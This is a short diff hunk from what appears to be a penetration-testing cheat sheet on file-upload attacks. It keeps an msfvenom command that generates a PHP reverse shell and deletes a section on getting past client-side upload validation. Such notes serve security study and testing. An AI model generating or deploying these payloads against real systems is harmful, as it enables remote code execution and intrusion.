@@ -9,15 +9,6 @@
 |PHP Reverse Shell|`msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > reverse.php`|
 
 ---
-
-## Bypasses
-
-### Client-Side
-
-|Bypass|Method|
-|---|---|
-|Disable JS validation|`CTRL+SHIFT+C` → toggle/remove upload filter in page inspector|
-
 ### Blacklist Bypass
 
 |Bypass|Example|
